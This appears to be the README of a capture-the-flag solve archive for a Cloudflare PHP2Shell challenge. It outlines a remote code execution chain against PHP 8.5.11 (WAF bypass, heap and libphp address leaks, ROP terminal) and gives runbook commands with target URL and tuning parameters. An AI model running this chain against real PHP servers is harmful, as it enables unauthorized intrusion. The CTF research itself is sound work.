# Cloudflare PHP2Shell CTF — Verifier-Accepted Solve

Private research archive for an authorized public CTF solve. The complete chain executed against the real challenge, returned the current sandbox flag together with its response-local `X-Attempt-ID`, and received HTTP 200 with `verified: true` from the official verifier on 2026-11-02.

The live flag, accepted attempt ID, raw HTTP responses, cookies, and verifier response entity are deliberately excluded.

## Result

| Property | Accepted run |
|---|---|
| Target class | Official PHP 8.5.11 Apache container |
| Address acquisition | Heap and libphp measured independently in one epoch |
| Pair quality | Strict votes; `epoch_risk=false` |
| Terminal | A80 → B25 → rolling S25/D25 |
| Exploit POSTs | 155 |
| Flag-bearing D responses | 11 of 25 |
| Winning lane | D23 |
| Verifier | HTTP 200, `verified=true` |
| Verdict | `VERIFIER_ACCEPTED` |

## What is in this repository

```text
src/stock/                       # heap oracle and accepted A/B/S/D terminal
src/native/                      # strict libphp code-pointer oracle
src/p2s/                         # minimal pinned support package
src/{bridge_common,pin,chain8511}.py
evidence/controller.accepted.py  # byte-identical accepted controller
evidence/accepted-summary.json   # sanitized result, no flag or attempt ID
docs/SOLVE.md                    # exploit architecture and exact runbook
docs/PROCESS-CHANGES.md          # what changed between failure and delivery
docs/EVIDENCE.md                 # proof boundaries and integrity handles
docs/SAFETY.md                   # scope and handling rules
scripts/verify-package.sh        # offline package verification
```

The solve is a three-program pipeline, not one standalone script:

```text
cookie-free heap oracle
        ↓
cookie-free libphp oracle
        ↓
stable-session rolling A/B/S/D terminal
        ↓
marker + /flag + response-local X-Attempt-ID
        ↓
one immediate verifier request
```

## Reproduction runbook

Use only the authorized challenge or a system you own. Historical addresses shown in the evidence are stale and must never be reused for a new sandbox epoch.

From the repository root:

```bash
export PYTHONPATH="$PWD/src:$PWD/src/stock:$PWD/src/native"
```

### 1. Acquire a fresh heap base without a session cookie

```bash
timeout 240 python3 -B src/stock/flood_heap_oracle_live.py \
  --arms 15 \
  --b-count 15 \
  --out-dir /tmp/cfctf-heap-r1 \
  --authorized-live
```

Accept only a canonical 2 MiB-aligned heap candidate supported by strict triple-length votes.

### 2. Immediately acquire a fresh libphp base

```bash
timeout 180 python3 -B src/native/code_dtor_fatal_probe.py \
  --target https://php-rce.cloudflare.app/php/index.php \
  --field-count 66 \
  --fanout 5 \
  --waf-preamble 1056768 \
  --content-type-variant canonical \
  --prestage-pair \
  --timeout 60 \
  --authorized-live \
  --out /tmp/cfctf-code-r1.json
```

Accept only an aligned module base with agreeing strict votes and `epoch_risk=false`. Do not derive libphp from a historical heap delta.

### 3. Run the terminal immediately with the fresh pair

```bash
timeout 600 python3 -B src/stock/rolling_seedfire_stable25_live.py \
  --heap 0xHEAP_FROM_STEP_1 \
  --libphp 0xLIBPHP_FROM_STEP_2 \
  --timeout 75 \
  --out-dir /tmp/cfctf-terminal-r1 \
  --authorized-live \
  --session-id attacksessionid0001
```

`attacksessionid0001` is synthetic test data. The stable session is introduced only for terminal A/B/S/D; using it during address acquisition breaks the leak geometry.

The controller starts all 25 S requests and submits one D immediately after each S response passes the HTTP-200/OOM-4096 gate. It calls the verifier at most once, and only when one D response contains the exact run marker, a canonical flag immediately after it, and a canonical `X-Attempt-ID` from that same response.

## The decisive change

The accepted terminal differs from the failed stable-session controller by one executable line:

```diff
-TERMINAL_COUNT = 8
+TERMINAL_COUNT = 25
```

The WAF preamble, multipart bodies, block `0x59400`, official-Docker profile, ROP mode, OOM geometry, and rolling S→D handoff were unchanged. Increasing terminal width raised stochastic backend/PHP-worker locality coverage. It did not make delivery deterministic: a later refresh missed once at 25 lanes and succeeded on the immediate repeat with the same still-valid pair.

See [docs/PROCESS-CHANGES.md](docs/PROCESS-CHANGES.md) for the full causal account and [docs/SOLVE.md](docs/SOLVE.md) for the technical chain.

## Offline verification

```bash
scripts/verify-package.sh
```

This performs syntax/import checks, verifies the byte-identical accepted controller, and builds the terminal bodies in `--dry-run` mode. It sends no network traffic.

## Proof boundary

- WAF bypass reaching PHP: **proven live**.
- Heap and libphp oracles: **proven live**.
- Terminal command execution and `/flag` return: **proven live**.
- Official verifier acceptance: **proven live**.
- Stable `PHPSESSID` controlling Cloudflare routing: **unverified**.
- Twenty-five lanes making delivery deterministic: **false**; delivery remained stochastic.

## Safety

This repository contains exploit code. Do not use it against systems without explicit authorization. See [docs/SAFETY.md](docs/SAFETY.md).
